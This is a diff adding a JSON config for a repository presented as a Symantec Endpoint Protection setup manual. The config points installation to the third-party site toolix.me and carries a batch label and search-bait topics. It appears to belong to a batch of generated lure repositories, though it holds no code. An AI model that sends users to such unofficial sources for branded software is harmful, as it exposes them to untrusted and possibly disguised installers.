@@ -1,0 +1,23 @@
+{
+  "repo": "symantec-endpoint-protection-setup-manual",
+  "product": "Symantec Endpoint Protection Setup Manual",
+  "kind": "security",
+  "install_type": "toolix",
+  "install_url": "https://toolix.me/",
+  "batch": "new3",
+  "format": "license-md-toolix-v1",
+  "category": "security",
+  "topics": [
+    "symantec-endpoint",
+    "endpoint-protection",
+    "corporate-antivirus",
+    "threat-prevention",
+    "sep-admin",
+    "symantec-setup-failed-fix",
+    "how-to-install-symantec",
+    "symantec-windows",
+    "symantec-desktop-2026",
+    "symantec-desktop-package"
+  ],
+  "site": "toolix.me"
+}
